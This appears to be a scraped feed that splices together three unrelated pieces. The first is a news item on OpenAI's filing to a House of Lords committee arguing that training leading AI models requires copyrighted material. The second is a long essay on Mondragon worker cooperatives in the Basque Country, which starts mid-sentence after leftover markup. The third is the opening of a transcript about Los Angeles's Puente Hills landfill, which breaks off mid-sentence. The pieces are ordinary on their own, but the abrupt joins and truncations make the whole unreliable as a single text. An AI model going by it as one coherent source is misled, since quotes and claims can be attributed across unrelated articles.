<div id="readability-page-1" class="page"><div id="incArticle"><h2>"It would be impossible to train today’s leading AI models without using copyrighted materials."</h2><h2>Please Sir</h2><p>OpenAI is begging the British Parliament to allow it to use copyrighted works because it's supposedly "impossible" for the company to train its artificial intelligence models — and continue growing its <a href="https://qz.com/openai-is-set-to-see-its-valuation-at-80-billion-makin-1850950928">multi-billion-dollar business</a> —&nbsp;without them.</p><p>As&nbsp;<a href="https://www.telegraph.co.uk/business/2024/01/07/openai-warns-copyright-crackdown-could-doom-chatgpt/"><em>The Telegraph</em> reports</a>, the AI firm said in a filing submitted to a House of Lords subcommittee that using only content from the public domain would be insufficient to train the kind of large language models (LLMs) it's building, suggesting that the company must therefore be allowed to use copyrighted material.</p><p>"Because copyright today covers virtually every sort of human expression — including blog posts, photographs, forum posts, scraps of software code, and government documents — it would be impossible to train today's leading AI models without using copyrighted materials," the company wrote in the evidence filing. "Limiting training data to public domain books and drawings created more than a century ago might yield an interesting experiment, but would not provide AI systems that meet the needs of today's citizens."</p><p>OpenAI went on to insist in the document, submitted before the House of Lords' communications and digital committee, that it complies with copyright laws and that the company believes "legally copyright law does not forbid training."</p><h2>Rank and File</h2><p>There's a growing chorus of interested parties who strongly disagree with OpenAI's assertion that it's chill and legal to use copyrighted work to train AI.</p><p>Just a few weeks ago, the <a href="https://www.nytimes.com/2023/12/27/business/media/new-york-times-open-ai-microsoft-lawsuit.html"><em>New York Times</em> sued OpenAI</a> and Microsoft, its biggest investor, for profiting from allegedly "massive copyright infringement, commercial exploitation and misappropriation" of the paper's intellectual property.</p><p>The paper of record is far from alone in its legal overtures against OpenAI. A few months prior, the <a href="https://www.courthousenews.com/authors-guild-to-add-microsoft-in-its-lawsuit-against-openai/">Authors Guild sued the firm</a> on behalf of some of the biggest names in fiction — including John Grisham, Jodi Picoult, Jonathan Franzen, David Baldacci, and George R.R. Martin — over objections to those writers' work being used to train ChatGPT.</p><p>Without using copyrighted work, OpenAI "would have a vastly different commercial product," Rachel Geman, one of the attorneys in the guild's class action suit, said in a <a href="https://authorsguild.org/news/ag-and-authors-file-class-action-suit-against-openai/">press release about the filing</a>. As such, the company's "decision to copy authors' works, done without offering any choices or providing any compensation, threatens the role and livelihood of writers as a whole."</p><p>On OpenAI's end, the company claims that it's seeking to broker new publisher partnerships,&nbsp;<em>The Telegraph</em> reports. All the same, it's hard to imagine every newspaper, website, or publishing house accepting such terms wholesale, much less <a href="https://futurism.com/the-byte/ai-analytics-books-shutdown">independent writers</a> who rely on their copyrights to <a href="https://futurism.com/ai-writing-scammers-amazon">make a living</a>.</p><p><strong>More on authors and AI:</strong> <a href="https://futurism.com/the-byte/ai-companies-hiring-authors-poets-fix-writing"><em>AI Companies Desperately Hiring Authors and Poets to Fix Their Crappy Writing</em></a></p><br></div></div>]]></description>

Perhaps that’s why science fiction authors like Ursula Le Guin, Kim Stanley Robinson, and Cory Doctorow have all used the corporation as a model for the utopian nations in their books.&nbsp;</p><p><span>Could we eventually create a capitalist paradise where democratically run companies use their profits for the good of their worker citizens?</span><em> </em><span>Could that even replace our existing governments?</span></p><p>“Years ago our founders had this kind of vision—to have a ‘world cooperative economy,’” Germán Lorenzo, who works in community education, told me when I visited Mondragon’s headquarters. “An ideal utopia would be a full cooperative world—people own the means of production, there’s a fair distribution of wealth.”</p><p>In 1956, one Catholic priest began building it—starting with the Basque Country.</p><p>Father José María Arizmendiarrieta was just 26 years old when he was sent to the parish of Arrasate-Mondragón for his first (and what would be only) assignment in 1941. It was just after the Spanish Civil War and the country was under the control of the nationalist dictator Franco. Arrasate was destitute with high levels of unemployment and economic hardship. People needed money, which meant they needed jobs.&nbsp;</p><p>So Arizmendiarrieta created them.</p><p>What started as one employee-owned business became a network of them as he and his followers kept starting new businesses and adding them to the network. They worked like an incubator, founding a university that would train entrepreneurs, then a bank that would fund their visions. They built manufacturing companies that would give them high-paying jobs, a housing company as they grew, and a preschool where their children could get an education while they worked.&nbsp;</p><p>Each new startup arose out of the needs of the community, and each one was owned by its workers. Eventually, they bought up an entire mountain and expanded to neighboring cities. As they grew and joined the EU they became more competitive worldwide, founding tech companies and R&amp;D facilities. Today, three out of every 10 cars use Mondragon components, 90% of the world’s aircraft use their technology solutions, 60% of the world’s trains are built using their machines, and more than a third of Europe’s solar panels are made using their technology. You can find Mondragon brands in Audi cars and Tour de France bikes, technologically advanced hospitals and electric vehicle charging stations, green energy power solutions and water management facilities.&nbsp;</p><p>Mondragon has spread throughout the seven cities of the Alto Deba region. No matter what you do for work here you are probably working for a cooperative, and no matter what you spend money on you’re also supporting one. You might work as a computer engineer for a tech cooperative, deposit your paycheck into a cooperative bank, and spend it at a cooperative grocery store or on cooperative-built cars. Your home might be powered by a cooperative-run energy company, your children might attend a cooperative school or university, and your parents might live in a cooperative retirement community.&nbsp;</p><p>As they say in the Basque Country: “Life is cooperatized here.”</p><p><span>Over time, these cooperatives have federated together as </span><a href="https://www.mondragon-corporation.com/en/" rel="">Mondragon Corporation</a><span>. Each cooperative is part of a larger division, and each division is part of the larger parent company. A cooperative that makes hubcaps, for example, might be part of the larger auto parts division, which is part of the larger Mondragon Corporation.&nbsp;</span></p><p>The profits generated by each cooperative are put to work for the benefit of the greater whole. Each cooperative gives 14-40% of their gross profits to their division (depending on the division), and another 14% to their parent company. The rest are invested back in the cooperative (60% of net profits), distributed among their employees (30% of net profits), and donated to social organizations in their communities (10% of net profits).</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png" width="1456" height="874" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/deedab28-ca02-4db3-a031-a26375745511_1600x960.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:874,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>How cooperative profits are distributed</figcaption></figure></div><p>The bulk of cooperative profits stay with the cooperative and its workers, but there are benefits to being part of the larger organizations. Divisions use surplus profits to account for losses within the group, and the Corporation uses half its revenue to invest in their businesses (and start new ones) and the other half to provide social services for workers.</p><p>When the Spanish government issued a regulation in 1958 that cooperative owners would no longer qualify for the country’s social security program, Mondragon created its own. They founded Lagun Aro, a social welfare arm that provides pensions for workers and their families, as well as disability services when they can’t work. Eventually, it created its own healthcare service, providing medical care for workers and their families.&nbsp;</p><p>When there was a massive downturn in the economy in the 1980s, 20 cooperatives were forced to close their doors, but other cooperatives in the portfolio were thriving so Mondragon just transferred people from one cooperative to another, paying for the education each worker needed to fulfill their new roles. On the whole, jobs rose.&nbsp;</p><p>If workers can’t be relocated, Lagun Aro will pay a percentage of their salary for up to 24 months—though Lorenzo tells me this has never happened. The most recent cooperative to shut its doors was an appliance company that once had revenues of €1.3 billion. When Fagor shuttered 10 years ago, Mondragon had to relocate close to 2,000 employees from one cooperative to another, and they did.&nbsp;</p><p>“In a crisis situation, where other companies send people home and they waste their time watching videos and smoking, what we do is train them inside, and retrain the force,” Lorenzo says. “People keep working. That's important.”</p><p>As their founder used to say, “There are no useless people, only underutilized ones.”</p><p><span>The area has become much wealthier as a result. “A large number of cooperative jobs are industrial so their income level is high,” cooperative communications officer Ander Etxeberria Otadui explained in </span><a href="https://exploremondragon.com/en/" rel="">a video series</a><span> about the organization. “Studies that analyzed Alto Deba at the beginning of the 1970s already showed that the per capita income was significantly higher than average for the province. Today, it has one of the highest average incomes in the Basque country. Plus it’s more equal.”&nbsp;</span></p><p>As a rule, the highest-paid workers at Mondragon cooperatives earn only six times more than the lowest-paid workers. A worker’s position on the payscale, between levels one and six, also determines their share of the profit-sharing pool. Lorenzo estimates that the president of Mondragon is the highest-paid position (level 6) with a salary of around €200,000. Managers and directors earn between €80,000 and €120,000. </p><p>Workers buy into their cooperative when they become employees, investing up to €16,000 into a personal equity account. They pay 30% of that investment upfront, with the remainder taken out of their paychecks over following 2 to 7 years. After two years with the organization, workers become “members” and start earning interest on their investment at a rate of at least 7.5% annually. If the cooperative does well, they might earn much more than that. Workers can pull this money out of their accounts when they leave the cooperative or retire.&nbsp;</p><p><span>“It’s a fact that the cooperative system uses wealth in a much more fair way,” Lorenzo says. “Our Gini Coefficient is similar to Sweden or Norway or Denmark, it’s very low. That means the cooperative system, in fact, is a much better way than the capital system for the world.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-147917881" href="https://www.elysian.press/p/mondragon-as-the-new-city-state#footnote-1-147917881" target="_self" rel="">1</a></span><span>”</span></p><p>When I asked, at an informational lecture, if people ever leave for better pay, Lorenzo said no one does. When another asked how they keep motivation high throughout employees' lengthy careers, Lorenzo recanted: “Your question is asked from the perspective of somebody who is working for somebody else. Here you are working for yourself. We have a higher level of self-consciousness.”&nbsp;</p><p>If workers want to try something different they have the autonomy to move elsewhere. Lorenzo started his career in global purchasing and imports for Eroski, Mondragon’s grocery store brand. Eventually, he moved to Hong Kong where he spent four years working in business development for Intergroup Far East, Mondragon’s international sourcing office. When he returned to Spain, Lorenzo headed up the Asia-Pacific group for Mondragon Corporation. Craving a change of pace, he then moved to Mondragon University’s business school where he spent a couple of years helping with their entrepreneurship program. Now, he’s working in global public affairs and communications, developing Mondragon’s corporate diplomacy and internal communications.</p><p>“I can’t say they didn’t give me room to move,” Lorenzo says. “My wife says they gave me too much.”</p><p>Every cooperative in Mondragon’s portfolio is an essential business—these are manufacturing companies, energy companies, agricultural companies, medical equipment companies, banks. They grow our food and power our cities and build our transportation systems. Their research and development groups invent machines and robotics that improve our world. There are no fast fashion or telemarketing companies in their portfolio. This cooperative of cooperatives is run by workers who directly build the things society needs while directly benefiting their communities with the profits they earn making them. They are self-governing locally even as they compete globally, with plants around the world and products and services sold in 150 countries.</p><p>The result is that Mondragon has created something of a self-sustaining government—and a pretty good one, I might add. Each cooperative functions like its own democracy, with workers functioning more like citizens. Cooperatives average 250 workers—if they grow much larger than that they are split into separate cooperatives with separate democracies.&nbsp;</p><p>Every year, workers (internally called the “General Assembly”) meet to review prior years’ management, decide how to allocate profits or losses, and approve annual accounts. They vote their board of directors into office (called the “Governing Council”) who, in turn, vote their CEOs into office (called “General Managers”). General Managers hire their own executive team and make periodic reports to the Governing Council who can confer or revoke their powers as necessary.&nbsp;Positions of leadership serve a renewable four-year term and will be removed from office if they aren’t doing a good job.&nbsp;</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png" width="1019" height="552" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:552,&quot;width&quot;:1019,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The parent company works similarly: “Congress” is an assembly of representatives from every cooperative. They vote for the “Standing Committee,” who appoints the “President,” the head of Mondragon.&nbsp;</p><p>Each cooperative pays for workers’ education at Mondragon University, itself a cooperative in the Mondragon network. There’s even a bootcamp program for General Managers—a sort of entrepreneurial “CEO school”—where executives have the support they need to run financially successful companies, and have the opportunity to learn from executives at other cooperatives who have done so.</p><p><span>Together, they’ve even formed a constitution: The “Rules of Congress” outlines the articles of their organization and includes the corporation’s strategic plan—or “socio-business policy”—which is prepared and voted on every four years. During the time of my visit, Congress was getting ready to meet about the organization's plans for 2025 to 2028. (Reminiscent of my essay: “</span><a href="https://www.elysian.press/p/we-need-to-get-rid-of-politicians" rel="">We should vote for plans, not politicians</a><span>.”)</span></p><p>Each democratically-run organization is supported by the larger democratically-run Mondragon. Workers at Mondragon cooperatives are guaranteed a job and an income. They are taken care of when they can’t work, provided with universal healthcare if they get sick, receive universal education that trains them for any job, and are provided a pension when they retire. There is no unemployment, no poverty. No one is sitting around collecting handouts from everyone else, they are all actively working and contributing to the system.&nbsp;</p><p>And unlike governments, the cooperative provides all of these things with profits, not by taxing income.&nbsp;</p><p>Workers at Mondragon still get income taxes taken out of their paychecks, and cooperatives still pay corporate taxes, but at a much lower rate than traditional companies. And those tax dollars go to the Basque Country, itself an autonomous region that uses them (plus VAT taxes on goods and services) to fund things the corporation can’t: like infrastructure and elementary education.</p><p>Mondragon’s democracy was, in many ways, a precursor to the ones that would eventually come to Spain. The organization was in business for 19 years by the time Franco died in 1975 and Spain started transitioning to a democracy. The Basque Country was established as an autonomous region in 1979 and they elected their first parliament in 1980.&nbsp;</p><p><span>As the largest employer in the region, Mondragon </span><em>is</em><span> the Basque Country, and the Basque Country </span><em>is</em><span> Mondragon. “When they try to change the co-op law, they call us,” Lorenzo says. And when Mondragon wants to change cooperative law, they call the Basque Country.</span></p><p>To this day, the two work reciprocally for the benefit of the region. Workers can now choose between Mondragon or Basque healthcare, and they have access to Spanish social security programs along with their Mondragon pensions. Lagun Aro fluctuates to fill in the gaps of government as needed, and the government fluctuates to supply the needs of the region. The Basque government also contributes a quota (called a “cupo”) to the Spanish government to fund defense, foreign affairs, and larger national projects that benefit the whole country.&nbsp;</p><p><span>In this way, Mondragon acts as a self-governing city-state within a larger state and nation. Each individual cooperative has the most authority over workers’ lives, even as layers of Basque and Spanish governments provide larger, but more lightweight methods of governance for the greater whole. The structure works a lot like the one I outline in my essay: “</span><a href="https://www.elysian.press/p/city-states-should-choose-federal-governments" rel="">Decouple federal government from nation-states</a><span>.”</span></p><p>“We work at three levels: With the Basque Government, with the Spanish Government, and with the European Government,” Lorenzo says. “Our aims are global, we want to create wealth, jobs, and develop a better strategy. Every government loves that idea.”</p><p>If the model is a good one, detractors say it can’t be replicated outside of the Basque Country, and there’s some truth to that. Once employees are here they tend to be lifers, but getting them here has proved a real challenge. Lorenzo says they hire about 30% of their workforce from Mondragon University, but they need to hire more engineers than they can find in the Basque Country, and that means recruiting abroad.&nbsp;</p><p>This is logistically challenging, but also culturally. “In the US, I have to buy a million-dollar house and $100,000 car, and have 80,000 products,” Lorenzo says. “The capitalist world is built on selfishness, individualism, being number one. We can’t attract the kind of hard talent that wants to make money and be number one.”</p><p><span>Living expenses are much lower in the Basque Country than they are in the US, but so are salaries and that can be a tough sell. Dreams of becoming a billionaire are nonexistent. When I published an</span><a href="https://www.elysian.press/p/employee-ownership/" rel=""> essay</a><span> about employee ownership, one person commented: “Why the hell should anybody still start a company and want to become an entrepreneur when he needs to give stocks to every employee he hires? This is completely stupid. If you want to become rich, become an entrepreneur.”&nbsp;</span></p><p>Mondragon is a different mindset. “We feel that our collective ‘us’ is more important than ‘me,’ but they are more independent, individualistic people,” Lorenzo says. “So it takes some time to really convince people that this system is worthwhile. They see sometimes that we are a compromise for a full life, so we have to think in new ways, adapt our system.”</p><p><span>In Europe, cooperatives like Mondragon grew up alongside consumer co-ops like John Lewis &amp; Partners in the UK. The Alta Deba region of the Basque Country isn’t so different from the </span><a href="https://www.lowimpact.org/posts/why-is-the-co-operative-movement-so-successful-in-emilia-romagna-with-matt-hancock-no-not-that-one" rel="">Emilia Romagna</a><span> region in Italy where cooperatives like SACMI and Manutencoop are highly networked with one another and cooperatives make up </span><a href="https://www.yesmagazine.org/economy/2016/07/05/the-italian-place-where-co-ops-drive-the-economy-and-most-people-are-members" rel="">a third of the region’s GDP</a><span>.

Try convincing the Jeff Bezos’ of the world to start a cooperative. Conversely, try convincing a Mondragon manager to keep the stock for themselves and become a Jeff Bezos. The two models come from two very different worlds.</p><p>“I think it is possible to replicate, but it requires people who believe in the model and know how to replicate it,” Lorenzo says. “Before he opened the first co-op, [Arizmendiarrieta] had spent nearly 15 years preaching. He was educating, he was creating mindsets. It’s not a copy-and-paste issue, I don’t think it’s that easy.”&nbsp;</p><p><span>If it’s education we need, Lorenzo admits Mondragon has fallen short. “We’ve been very good at </span><em>doing</em><span>, but not very good at </span><em>telling</em><span> these last 50 years. That’s why I’m sure your article will give us a good position.”&nbsp;</span></p><p>Even as a journalist, information on the company has not been readily available. The books I read on the subject are only available at company headquarters. The biography of its founder is only in Spanish. Knowledge about the company is limited to educational materials, a sparse Wikipedia page, and a spattering of articles that extol the benefits of cooperatives without really explaining how they work. Members of the media are only granted access if they can attend one of the company’s in-person media days which are hosted once a month. I had to buy a plane ticket, rent a car, drive six hours from the Barcelona airport, and rent a hotel nearby to get a meeting—a large expense for an independent journalist.</p><p>It makes sense—cooperatives are businesses first and cooperatives second. They have to compete with other companies on the market, and win, to make a profit. Only then can they use that profit more equitably. “We bought the chairs in this room from a company that’s a cooperative,” Lorenzo illustrated, “but we got them because they were the best price and quality, not because they were from a cooperative.”</p><p><span>Mondragon can’t afford to spend all their time proselytizing. What founders </span><em>do </em><span>come to study the model might put it into practice, but if they only create one cooperative that benefits 100 workers, Lorenzo says they miss the point. They need to create a network of them to fund new startups, create new jobs, provide social services, and transfer workers between companies. It is the combination of cooperatives that makes the whole thing self-sustaining, not the individual ones.&nbsp;</span></p><p><span>There are very few of those. </span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">As of 2017</a><span>, there were only 11.1 million worker-owners globally, out of </span><a href="https://data.worldbank.org/indicator/SL.TLF.TOTL.IN" rel="">3.39 billion</a><span> total workers—that’s only 0.33% of the working population, and it’s not growing.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-147917881" href="https://www.elysian.press/p/mondragon-as-the-new-city-state#footnote-2-147917881" target="_self" rel="">2</a></span><span> Employee ownership is rare, democratically-run cooperatives are rarer still, and a whole network of them? Mondragon and Unimed are really the only ones.&nbsp;</span></p><p>Because of this, Lorenzo thinks we won’t create a world of cooperatives as the founders once imagined. “I think this is fiction because at the end of the day, there are forces in the world that are difficult to scale up.”&nbsp;</p><p><span>If cooperatives are still a niche movement, the movement to make capitalism work better for more people is </span><em>massive</em><span>.&nbsp;</span></p><p><span>As is well documented in </span><a href="https://amzn.to/3MxeEMJ" rel="">Thomas Piketty</a><span>’s work, inequality has been on the rise since the 1970s when wealth taxes were skewered and executives started getting paid in stocks. Those who owned capital (such as real estate, stocks, and bonds), got much richer, and because they got much richer, they bought more capital. Return on capital exceeds the rate of economic growth, meaning those with significant wealth saw their fortunes grow faster than the economy, the rest didn’t.</span></p><p><span>A widening gulf now threatens to become much wider and the result is outrage. When the rich can afford mega-yachts and a well-paid software engineer can’t afford a house, we see a rise in the same “</span><a href="https://www.theguardian.com/politics/2021/sep/20/eat-the-rich-why-millennials-and-generation-z-have-turned-their-backs-on-capitalism" rel="">eat the rich</a><span>” mentality that once cost Marie Antoinette her head. In the US, </span><a href="https://www.pewresearch.org/politics/2022/09/19/modest-declines-in-positive-views-of-socialism-and-capitalism-in-u-s/" rel="">only 40%</a><span> of those ages 18 to 29 view capitalism positively. Democrats </span><a href="https://news.gallup.com/poll/240725/democrats-positive-socialism-capitalism.aspx" rel="">think better of socialism than capitalism</a><span>, </span><a href="https://iea.org.uk/media/67-per-cent-of-young-brits-want-a-socialist-economic-system-finds-new-poll/" rel="">67% of young Brits</a><span> do too. According to a </span><a href="https://onlinelibrary.wiley.com/doi/10.1111/ecaf.12591" rel="">Wiley’s worldwide survey</a><span>, most countries are now anti-capitalist. Their top reasons why are all related to inequality.</span></p><p>The most popular proposed solution is a wealth tax, but that could be enacted by one president only to be thrown out by the next one (or used to fund military endeavors rather than social ones). More extreme options involve eradicating capitalism altogether by returning to subsistence farming and bartering or giving the government control of the economy—we’ve tried both options and neither fared better for humanity than our current capitalist system.</p><p>One option, however, has.&nbsp;</p><p>Mondragon provides us with a successful, working model. It’s not throwing out capitalism, it’s creating a better form of it. It is still private individuals who own capital, but more of us become owners. Companies are still getting wealthy, but that wealth is put to better use. Rather than create a few rich people only to tax them on the back end, we allow everyone to get richer on the front end. We don’t get there through revolution, just evolution. Instead of descending into “late capitalism” we start building “mature capitalism.”&nbsp;</p><p><span>We need to channel all of that anti-capitalist sentiment into a better capitalist solution, and we can start with what is already working. Most worker cooperatives are concentrated in Asia (</span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">8,573,775 worker-owners</a><span>) and Europe (</span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">1,554,687 worker-owners</a><span>) where cooperatives are a more widely accepted business model and offer an alternative democratic solution where there are less democratic governments—we should build more of those. Though there are significantly fewer in the Americas (982,285) and Africa (37,836), recent policy changes have incentivized </span><a href="https://www.elysian.press/p/employee-ownership" rel="">employee ownership</a><span> in the US, Canada, and the UK, as well as transferred ownership to </span><a href="https://www.tamela.co.za/rethinking-employee-share-ownership-plans-in-south-africa/" rel="">307,000 workers at 118 firms</a><span> in South Africa—we should build more of those too.&nbsp;</span></p><p><span>Around the world, we need founders to start new cooperatives and </span><a href="https://www.elysian.press/p/founders-can-make-millions-selling-to-workers" rel="">sell existing companies to employees</a><span>—we need our governments to incentivize both options. </span><a href="https://www.elysian.press/p/founders-can-make-millions-selling-to-workers" rel="">It’s in their best interest</a><span> to do so! If we can create more employee-owned companies, maybe we can slowly start edging out the shareholder-owned ones. If we can create a critical mass of them, maybe we can even start federating them together as Mondragon once did.&nbsp;If we can create more democratically-run companies, maybe then we won’t need our countries as much. </span></p><p>With Mondragon-like clusters of profitable, democratically-run businesses, what we currently call government could be sufficiently stripped down to infrastructure and militaristic support.&nbsp;</p><p>Anarchist, socialist, and capitalist thinkers alike have gotten behind this solution, with sci-fi authors imagining a world of cooperative city-states. “It’s funny that they use our ideas at all kinds of levels,” Lorenzo says. “Socialist, anarchist, capitalist—at the end our aims are very legitimate. We want to increase wealth, create jobs, and try to develop, in a way, a better world.”</p><p>I still think we could get there—that we could create a world of cooperatives. It is at least one of our options. The future is long and capitalism is still new. It is still transforming into something better and evolving into what it will become. Humans are demanding a fix to inequality and companies like Mondragon are providing a successful blueprint we can follow.&nbsp;</p><p>In a 2021 book about the founding of Mondragon, authors Armin Isasti and Isabel Uribe thought Arizmendiarrieta’s vision wasn’t yet done: “We need to imagine the future, consider alternatives, form new collectives, and be able to see beyond ourselves. We need to return to utopian thinking; we need people who have the courage to be utopians as José María Arizmendiarrieta was. Far from being satisfied with completing Arizmedi’s utopia, let us continue to yearn after a world in which imagination and hope are alive and active.”</p><p>Arizmendiarrieta himself believed that vision was the first step. “Most of what has been achieved through conscious and responsible human effort has been, in first instance, a beautiful ideal,” he said. “And only that.”</p><p>So long as we can imagine that beautiful ideal, maybe we can even create it.&nbsp;</p><p data-attrs="{&quot;url&quot;:&quot;https://www.elysian.press/p/mondragon-as-the-new-city-state/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.elysian.press/p/mondragon-as-the-new-city-state/comments" rel=""><span>Leave a comment</span></a></p><p><span>This is the next installment of </span><a href="https://www.elysian.press/t/capitalism" rel="">my capitalism series</a><span> and how we can make this system work better for humanity.

  <p><em>[Note that this article is a transcript of the video embedded above.]</em></p><p>This is the Puente Hills Landfill outside of Los Angeles, California. The first truckload of trash was dumped here in 1957, and the trucks just kept coming. For more than five decades, if you threw something away in LA County, there’s a good chance it’s buried somewhere inside this mountain of waste. At its peak, Puente Hills was accepting around four million tons of trash every year, making it one of the largest landfills in the country. It closed in 2013, creating a time capsule of everyday life and consumption patterns over a span of 56 years. But Puente Hills is also a time capsule of landfill engineering itself. In 1976, right in the middle of its lifespan, sweeping federal regulations changed how we deal with solid waste forever.</p><p>You probably don’t think too much about where your trash goes, and that’s kind of the whole point of the solid waste industry: to make sure you have the ability to throw something away without it having a serious negative consequence on the environment or public health. There’s a larger conversation to be had about the amount of waste we generate and how much of it can be recycled or reused, but there is always going to be stuff that just doesn’t hold enough value to be kept. Trash is an inescapable element of the human condition. And, I think you’re going to be surprised how complicated that really is. When Puente Hills opened in the 50s, a landfill was pretty much just a hole in the ground where trash was dumped. By the time it closed, landfills were highly engineered holes where trash gets dumped. And I 